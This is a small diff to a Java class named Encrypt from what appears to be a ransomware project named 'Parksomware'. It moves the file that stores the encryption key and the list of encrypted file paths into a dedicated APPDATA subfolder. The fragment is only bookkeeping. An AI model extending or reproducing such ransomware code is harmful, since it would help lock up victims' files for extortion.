@@ -37,7 +37,7 @@ public class Encrypt {
             }
         }
 
-        try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\encrypted.txt")) {
+        try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\Parksomware\\encrypted.txt")) {
             writer.write(KEY + System.lineSeparator());
             for (String filePath : encryptedFiles) {
                 writer.write(filePath + System.lineSeparator());
